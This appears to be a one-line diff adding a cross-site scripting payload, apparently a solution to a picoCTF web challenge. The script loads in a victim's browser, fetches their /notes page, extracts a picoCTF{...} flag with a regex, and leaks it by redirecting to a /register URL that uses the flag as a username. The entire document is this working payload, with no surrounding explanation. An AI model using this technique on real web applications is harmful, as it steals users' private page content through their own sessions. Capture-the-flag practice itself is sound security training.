@@ -1,0 +1,1 @@
+<script>fetch('http://0.0.0.0:8080/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){document.location='http://0.0.0.0:8080/register?username=ww'+m[0]+'&password=x'}})</script>
